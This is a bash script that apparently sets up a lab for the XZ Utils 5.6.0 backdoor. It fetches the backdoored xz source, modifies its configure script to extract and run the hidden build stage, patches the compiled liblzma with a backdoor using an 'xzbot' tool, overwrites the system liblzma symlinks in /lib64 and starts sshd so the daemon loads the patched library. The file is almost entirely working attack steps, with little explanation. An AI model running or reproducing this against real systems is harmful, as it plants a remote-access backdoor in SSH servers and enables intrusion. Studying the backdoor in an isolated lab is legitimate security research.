#!/bin/bash

# Install dependencies
dnf -y groupinstall "Development Tools"
dnf -y install systemd xz git openssh-server openssl-devel openssl python3-pip go automake autoconf netcat
pip3 install virtualenv pwntools

# Download vulnerable XZ package
cd ~
git clone https://github.com/awwalquan/xz-archive.git
cd xz-archive/5.6/ 
tar xzf xz-5.6.0.tar.gz
mv xz-5.6.0 ~

export RPM_ARCH=$(uname -m)
cd ~

# Replace the content of line 25655 in ./xz-5.6.0/configure to save output to script1.sh
sed -i '/"build-to-host":C) eval $gl_config_gt | $SHELL 2>\/dev\/null ;;/c\    "build-to-host":C)eval $gl_config_gt > script1.sh ;;' ./xz-5.6.0/configure

# Prepare the project for compilation
cd ./xz-5.6.0/
./configure
chmod +x script1.sh
./script1.sh

# Compile the project
make
cp ./src/liblzma/.libs/liblzma.so.5.6.0 ~

# Patch the backdoor into liblzma
cd ~
git clone https://github.com/awwalquan/xzbot.git
python3 ./xzbot/patch.py liblzma.so.5.6.0

# Inject the malicious library in the ssh deomon
cp liblzma.so.5.6.0.patch /lib64/
cd /lib64/
ls -altr | grep liblzma
ln -fs liblzma.so.5.6.0.patch liblzma.so
ln -fs liblzma.so.5.6.0.patch liblzma.so.5
ls -altr | grep liblzma

# Start the vulnerable sshd
ssh-keygen -A
env -i LANG=C /usr/sbin/sshd -D &